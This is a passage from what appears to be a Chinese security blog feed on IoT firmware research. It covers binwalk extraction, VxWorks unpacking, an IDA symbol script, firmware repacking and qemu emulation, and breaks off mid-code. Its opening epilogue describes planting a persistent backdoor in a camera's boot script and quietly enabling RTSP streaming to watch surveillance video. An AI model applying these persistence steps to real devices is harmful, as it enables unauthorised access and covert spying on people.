title="后记"></a>后记</h2><p>这个系统竟然可改写，我之前遇见过的摄像头都是不可改写系统。</p><p><img alt="image-20200807193009019" data-src="https://nocbtm.github.io/imgs/image-20200807193009019.png" class="lozad"></p><p>修改一下初始化脚本，植入后门。这里要修改最初始的脚本，如果修改 <code>usr/imi/start.sh</code>重启后会复原</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/bin/run.sh</span><br></pre></td></tr></table></figure><p><img alt="image-20200807200653949" data-src="https://nocbtm.github.io/imgs/image-20200807200653949.png" class="lozad"></p><p>重启一下，连接成功。经检测重置之后后门依然有效</p><p><img alt="image-20200807200400625" data-src="https://nocbtm.github.io/imgs/image-20200807200400625.png" class="lozad"></p><p>而且发现了rtsp_server，再把这个服务悄悄放到初始化脚本里，这样不就随便看监控视频了吗</p><p><img alt="image-20200807202247047" data-src="https://nocbtm.github.io/imgs/image-20200807202247047.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;大致分析&quot;&gt;&lt;a href=&quot;#大致分析&quot; class=&quot;headerlink&quot; title=&quot;大致分析&quot;&gt;&lt;/a&gt;大致分析&lt;/h2&gt;&lt;p&gt;拿到摄像头第一步，拆机，看看有没有uart调试口，找一下flash芯片&lt;/p&gt;
&lt;p&gt;小米做的是真的好，不太好拆，可参考硬核
      
    
    </summary>
    
      <category term="iot" scheme="https://nocbtm.github.io/categories/iot/"/>
    
    
      <category term="iot" scheme="https://nocbtm.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>iot固件的一些操作</title>
    <link href="https://nocbtm.github.io/2020/07/06/iot%E5%85%A5%E9%97%A8-%E5%9B%BA%E4%BB%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/"/>
    <id>https://nocbtm.github.io/2020/07/06/iot入门-固件的一些操作/</id>
    <published>2020-07-06T09:46:47.000Z</published>
    <updated>2020-09-01T10:41:22.140Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然通过官网下载固件的方法比较便捷，但是有些厂商并不会提供固件的下载链接，这就需要我们通过其他途径来获取固件。使用从硬件设备提取固件的方法会比较通用（前提是需要有实体机设备），因为固件一般都会存储在 PCB 的某个位置里。将设备拆开之后，找到相应的 flash rom 或者 Nor flash，使用专门的工具（烧写器、编程器）进行固件的提取。</p><p>先认识一下flash文件系统和固件类型</p><h2 id="flash文件系统"><a href="#flash文件系统" class="headerlink" title="flash文件系统"></a>flash文件系统</h2><p>与普通计算机系统不同的是，嵌入式系统往往需要使用低成本的存储器，诸如EEPROM（带电可擦可编程只读存储器）或Nor/Nand Flash等。Nand flash存储器经常可以与NOR Flash存储器互换使用。大多数情况下闪存只是用来存储少量的代码，这时NOR闪存更适合一些，而NAND则是高数据存储密度的理想解决方案。</p><p>Reference:<a href="https://www.cnblogs.com/iriczhao/p/12128451.html" target="_blank" rel="noopener">Nand Flash 和Nor Flash的区别详解</a></p><p>这里列举一些最常见的Flash文件系统，具体如下：</p><h3 id="Squashfs"><a href="#Squashfs" class="headerlink" title="Squashfs"></a>Squashfs</h3><p>SquashFS 是一套基于Linux内核使用的压缩只读文件系统，文件最大支持2^64字节。他是基于GPL协议的开源软件。初始的版本使用gzip压缩，2.6.34版本Linux内核增加了支持LZMA和LZO压缩，并且在2.6.3内核版本上增加支持XZ压缩。OpenWrt以及DD-Wrt的固件使用的就是这种文件系统,多见于4～16MB的Nor型Flash中。</p><h3 id="JFFS-JFFS2"><a href="#JFFS-JFFS2" class="headerlink" title="JFFS/JFFS2"></a>JFFS/JFFS2</h3><p>全名是Journalling Flash File System，是RedHat公司开发的闪存文件系统，最早是为NOR Flash设计的，自2.6版本<br>以后开始支持NAND Flash，极适合用于嵌入式系统，多见于32MB以下的Nor型Flash固件中。它支持三种压缩算法：zlib、rubin以及rtime。</p><h3 id="YAFFS-YAFFS2"><a href="#YAFFS-YAFFS2" class="headerlink" title="YAFFS/YAFFS2"></a>YAFFS/YAFFS2</h3><p>全称为Yet Another Flash File System，是由Aleph One公司发展出来的NAND flash嵌入式文件系统。与JFFS不同的<br>是，YAFFS最初是专门针对Nand型Flash所设计的，对于大容量的Flash读写更有优势，而JFFS在小容量的FLASH中更具优势，两者各有侧重。这种文件系统多见于128MB以上的Nand型Flash固件中。</p><h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><p><img alt="image-20200724150957627" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724150957627.png" class="lozad"></p><p><img alt="image-20200724151101485" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724151101485.png" class="lozad"></p><h2 id="固件类型"><a href="#固件类型" class="headerlink" title="固件类型"></a>固件类型</h2><p>固件就是程序+文件系统的组合，由文件系统将多个程序组合成一个更大、更复杂的二进制文件。当然这里的大小指的是一个相对的概念。很多时候，固件的大小往往只有几MB，而在Windows或Linux上的可执行文件动辄就是几百MB，当然两者是不能比的，相比而言，固件是麻雀虽小，五脏俱全。</p><p>常见的固件类型，大概可分为如下几种：</p><h3 id="裸机程序"><a href="#裸机程序" class="headerlink" title="裸机程序"></a>裸机程序</h3><p>它是组成最简单的固件，也是最容易分析的固件，IDA可以正确识别并分析这种类型的固件。这类的设备可以看作是 “单片机设备”，设备固件中是比较简单的控制、循环逻辑，利用中断、例程来处理外部世界的各种事件，如常见的智能门锁内部固件</p><h3 id="实时操作系统"><a href="#实时操作系统" class="headerlink" title="实时操作系统"></a>实时操作系统</h3><p>面向控制，通信领域的实时操作系统（RTOS），如windriver公司的VxWorks、isi的psos、qnx系统软件公司的qnx、ati的nucieus等</p><p>Vxworks镜像分类</p><ul><li>可加载行VxWorks镜像：存储在开发机上，运行在板上RAM中</li><li>基于ROM的VXWorks镜像：存储在板上ROM，运行在板上RAM中</li><li>ROM驻留的VXWorks镜像：存储 在板上ROM，运行在板上ROM中</li></ul><h3 id="非实时操作系统"><a href="#非实时操作系统" class="headerlink" title="非实时操作系统"></a>非实时操作系统</h3><p>面向消费电子产品的非实时操作系统，包括个人数字助理（pad）、移动电话、机顶盒、电子书、webpone等。系统有Microsoft的WinCE，3Com的Palm，以及Symbian和Google的Andrioid等</p><h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><p>binwak 是一款优秀的固件分析、固件解包工具。可以用来解析绝大多数没有加密的固件，进行解包从而获取到固件的文件系统。</p><p>针对不同的flash文件系统也有不同的工具来解包，比如</p><p>1、Firmware Mod Kit广泛应用于Squashfs类型的固件编辑，支持多款路由器，OpenWrt和DD-Wrt的所有固件，以及TP-Link、ASUS、D-Link的大部分路由型号的固件。</p><p>2、mtd-utils 由于jffs/jffs2和yaffs/yaffs2是基于MTD的文件系统，因此可以使用Linux下的mtd-utils中的内核工具来获得对这两种文件系统的支持</p><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>binwalk通过识别文件头 智能扫描目标文件所有可识别的文件类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk DIR818LW_FW205b03.bin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file DIR818LW_FW205b03.bin </span><br><span class="line">DIR818LW_FW205b03.bin: data</span><br><span class="line">$ binwalk DIR818LW_FW205b03.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/6"</span></span><br><span class="line">120           0x78            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 5451004 bytes</span><br><span class="line">1704056       0x1A0078        PackImg section delimiter tag, little endian size: 8415232 bytes; big endian size: 6848512 bytes</span><br><span class="line">1704088       0x1A0098        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6848463 bytes, 2622 inodes, blocksize: 131072 bytes, created: 2015-07-09 07:38:10</span><br></pre></td></tr></table></figure><p>提取文件</p><p>“-e” 按照预定义的配置文件中的提取方法提取文件</p><p>“-M” 用于根据magic签名扫描结果进行递归提取</p><p>“-d” 用于限制递归提取深度，默认为8</p><p>“-A “ 使用普通可执行操作码签名扫描目标文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me  DIR818LW_FW205b03.bin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -Me DIR818LW_FW205b03.bin </span><br><span class="line"></span><br><span class="line">Scan Time:     2020-07-07 04:04:01</span><br><span class="line">Target File:   /home/iot/Desktop/tools/firmadyne/firmware/DIR818LW_FW205b03.bin</span><br><span class="line">MD5 Checksum:  be061ea71c8714b7c850e0a24291f269</span><br><span class="line">Signatures:    404</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/6"</span></span><br><span class="line">120           0x78            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 5451004 bytes</span><br><span class="line">1704056       0x1A0078        PackImg section delimiter tag, little endian size: 8415232 bytes; big endian size: 6848512 bytes</span><br><span class="line">1704088       0x1A0098        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6848463 bytes, 2622 inodes, blocksize: 131072 bytes, created: 2015-07-09 07:38:10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scan Time:     2020-07-07 04:04:08</span><br><span class="line">Target File:   /home/iot/Desktop/tools/firmadyne/firmware/_DIR818LW_FW205b03.bin-0.extracted/78</span><br><span class="line">MD5 Checksum:  55be7263933b41415e8c7c0fb46e614a</span><br><span class="line">Signatures:    404</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1090373       0x10A345        Cisco IOS microcode, <span class="keyword">for</span> <span class="string">"&amp;0"</span></span><br><span class="line">2934348       0x2CC64C        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">4116512       0x3ED020        Linux kernel version 2.6.30</span><br><span class="line">4153552       0x3F60D0        CRC32 polynomial table, little endian</span><br><span class="line">4653968       0x470390        Neighborly text, <span class="string">"NeighborSolicitstunnel6 init(): can't add protocol"</span></span><br><span class="line">4653988       0x4703A4        Neighborly text, <span class="string">"NeighborAdvertisementst add protocol"</span></span><br><span class="line">4658095       0x4713AF        Neighborly text, <span class="string">"neighbor %.2x%.2x.%.2x:%.2x:%.2x:%.2x:%.2x:%.2x lost on port %d(%s)(%s)"</span></span><br><span class="line">4673787       0x4750FB        HTML document header</span><br><span class="line">4673950       0x47519E        HTML document footer</span><br></pre></td></tr></table></figure><p>提取出的文件如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> _DIR818LW_FW205b03.bin.extracted/</span><br><span class="line">$ ls</span><br><span class="line">1A0098.squashfs  78  78.7z  squashfs-root</span><br><span class="line">$ <span class="built_in">cd</span> squashfs-root/</span><br><span class="line">$ ls</span><br><span class="line">bin  dev  etc  home  htdocs  include  lib  mnt  mydlink  proc  sbin  sys  tmp  usr  var  www</span><br></pre></td></tr></table></figure><h2 id="加密固件解包"><a href="#加密固件解包" class="headerlink" title="加密固件解包"></a>加密固件解包</h2><h3 id="vxwork"><a href="#vxwork" class="headerlink" title="vxwork"></a>vxwork</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ dd <span class="keyword">if</span>=wdr5620v3.bin of=400.lzma bs=1 skip=1024 count=861326</span><br><span class="line">861326+0 records <span class="keyword">in</span></span><br><span class="line">861326+0 records out</span><br><span class="line">861326 bytes (861 kB, 841 KiB) copied, 1.57047 s, 548 kB/s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>=文件名：输入文件名</span><br><span class="line">of=文件名：输出文件名</span><br><span class="line">skip=blocks：从输入文件开头跳过blocks个块后再开始复制</span><br><span class="line">bs=bytes：同时设置读入/输出的块大小为bytes个字节</span><br><span class="line">count= 读取的字节大小</span><br></pre></td></tr></table></figure><p>解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lzma -d 400.lzma</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -s 0xc1100 -n 512 -C bin</span><br></pre></td></tr></table></figure><p>提取符号表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"> </span><br><span class="line">symfile_path = <span class="string">'./C2E3A'</span> <span class="comment">#程序名</span></span><br><span class="line">symbols_table_start = <span class="number">8</span></span><br><span class="line">strings_table_start = <span class="number">0x9d00</span> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> open(symfile_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    symfile_contents = f.read()</span><br><span class="line"> </span><br><span class="line">symbols_table = symfile_contents[symbols_table_start:strings_table_start]</span><br><span class="line">strings_table = symfile_contents[strings_table_start:]</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_string_by_offset</span><span class="params">(offset)</span>:</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> strings_table[offset+index] != <span class="string">'x00'</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> strings_table[offset:offset+index]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_symbols_metadata</span><span class="params">()</span>:</span></span><br><span class="line">    symbols = []</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> xrange(<span class="number">0</span>, len(symbols_table),<span class="number">8</span>):</span><br><span class="line">        symbol_item = symbols_table[offset:offset+<span class="number">8</span>]</span><br><span class="line">        flag = symbol_item[<span class="number">0</span>]</span><br><span class="line">        string_offset = int(symbol_item[<span class="number">1</span>:<span class="number">4</span>].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        string_name = get_string_by_offset(string_offset)</span><br><span class="line">        target_address = int(symbol_item[<span class="number">-4</span>:].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        symbols.append((flag, string_name, target_address))</span><br><span class="line">    <span class="keyword">return</span> symbols</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_symbols</span><span class="params">(symbols_meta_data)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> flag, string_name, target_address <span class="keyword">in</span> symbols_meta_data:</span><br><span class="line">        idc.MakeName(target_address, string_name)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="string">'x54'</span>:</span><br><span class="line">            idc.MakeCode(target_address)</span><br><span class="line">            idc.MakeFunction(target_address)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    symbols_metadata = get_symbols_metadata()</span><br><span class="line">    add_symbols(symbols_metadata)</span><br></pre></td></tr></table></figure><h2 id="固件封装"><a href="#固件封装" class="headerlink" title="固件封装"></a>固件封装</h2><p>firmware-mod-kit 工具包可用于提取固件中的文档系统，然后对其进行修改，并重新打包成固件。我们可以使用它对固件做定制化的修改，但是也有可能被恶意地用于在固件中添加后门等，所以在下载固件时应到官方网站下载，并检查固件是否被修改过。</p><p>该工具包支持以下固件：</p><blockquote><p>DD-WRT v23 tested - versions v23 SP1 and later are compatible (soon older versions too).<br>DD-WRT v24 tested<br>OpenWrt White Russian tested<br>OpenWrt Kamikaze untested (should work) - not really necessary, based on OpenWrt has its Image Builder.<br>FreeWrt untested - should work ok<br>HyperWrt untested<br>Ewrt untested<br>Sveasoft Alchemy untested<br>Sveasoft Talisman untested<br>Linksys / other vendor not supported by scripts yet - haven’t added cramfs handling<br>ASUS WL-330G untested - should work ok<br>ASUS WL-520G untested - should work ok<br>ASUS WL-530G supported<br>ASUS WL-550G untested - should work ok<br>Trendnet TEW-632BRP tested<br>DLink DIR-615 untested<br>many others* untested</p></blockquote><p>可在 <a href="https://code.google.com/archive/p/firmware-mod-kit/" target="_blank" rel="noopener">google code</a> 下载 Firmware Mod Kit v0.99 安装包，然后解压安装，安装前需要先安装相应的依赖库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line"></span><br><span class="line"><span class="variable">$cd</span> firmware-mod-kit/src</span><br><span class="line">$./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><p>firmware-mod-kit 中包含以下几个工具脚本：</p><blockquote><p>extract-firmware.sh：解包固件<br>build-firmware.sh：重新打包固件<br>check_for_upgrade.sh：检查更新<br>unsquashfs_all.sh：解包提取出来的 squashfs 文档</p></blockquote><h2 id="固件对比"><a href="#固件对比" class="headerlink" title="固件对比"></a>固件对比</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bmaia/binwall</span><br><span class="line"></span><br><span class="line">python binwally.py dir1 dir2</span><br></pre></td></tr></table></figure><h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>因为例如 MIPS、ARM 指令集是无法直接在 X86 的指令集机器上直接运行的，所以就需要使用一个模拟环境，可以用 qemu或者Firmadyne来模拟</p><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><p>qemu有系统模式和用户模式。对于只想模拟单个程序的话使用用户模拟即可；对于整个设备（摄像头、路由器等）的环境来说，使用系统模式比较方便</p><h4 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h4><p>以 dir645_FW_103.bin 为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ wget ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP</span><br><span class="line">$ binwalk dir645_FW_103.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/2"</span></span><br><span class="line">112           0x70            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 4237576 bytes</span><br><span class="line">1441904       0x160070        PackImg section delimiter tag, little endian size: 3169792 bytes; big endian size: 6172672 bytes</span><br><span class="line">1441936       0x160090        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6170670 bytes, 2216 inodes, blocksize: 262144 bytes, created: 2012-10-09 10:24:09</span><br><span class="line"></span><br><span class="line">$ binwalk -Me dir645_FW_103.bin </span><br><span class="line">$ ls</span><br><span class="line">dir645_FW_103.bin*  _dir645_FW_103.bin.extracted/</span><br><span class="line">$ file _dir645_FW_103.bin.extracted/squashfs-root/bin/busybox </span><br><span class="line">_dir645_FW_103.bin.extracted/squashfs-root/bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><p>查看<code>squashfs-root/bin/busybox</code>为mips32 静态链接程序,所以用<code>qemu-mips-static</code>来模拟，启动单个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp /usr/bin/qemu-mips-static .</span><br><span class="line">$ sudo chroot . ./qemu-mips-static ./sbin/httpd</span><br></pre></td></tr></table></figure><h4 id="系统模式"><a href="#系统模式" class="headerlink" title="系统模式"></a>系统模式</h4><p>下载不同架构的kernel和文件系统，用来系统模拟。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r -np -nH -R index.html https://people.debian.org/~aurel32/qemu/</span><br></pre></td></tr></table></figure><p><img alt="image-20200707180834331" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200707180834331.png" class="lozad"></p><p>以mips为例</p><p><img alt="image-20200707181153719" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200707181153719.png" class="lozad"></p><p>先在物理机添加个虚拟网卡tap0并配置ip，以便和虚拟机进行通信</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">Set <span class="string">'tap0'</span> persistent and owned by uid 1000</span><br><span class="line">$ ifconfig </span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.137  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::f47c:851e:6b2a:ca13  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:44:85:45  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 1273210  bytes 1632037231 (1.6 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 262339  bytes 15789435 (15.7 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 564  bytes 42862 (42.8 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 564  bytes 42862 (42.8 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">$ sudo ifconfig tap0 192.168.164.139/24</span><br><span class="line">$ ifconfig </span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.137  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::f47c:851e:6b2a:ca13  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:44:85:45  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 1272982  bytes 1632018319 (1.6 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 262111  bytes 15770766 (15.7 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 544  bytes 41616 (41.6 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 544  bytes 41616 (41.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">tap0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.139  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::2054:a3ff:fead:808f  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 22:54:a3:ad:80:8f  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 17  bytes 3330 (3.3 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 5  bytes 430 (430.0 B)</span><br><span class="line">        TX errors 0  dropped 3 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>需要注意的是配置的tap0的ip要和本地ip在同一个网段，如果配置错误，可以<code>sudo tunctl -d tap0</code>删除重新配置</p><p>然后启动虚拟机，虚拟机默认用户密码为root/root，登录后我们需要配置虚拟机ip地址与tap0也在同一网段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 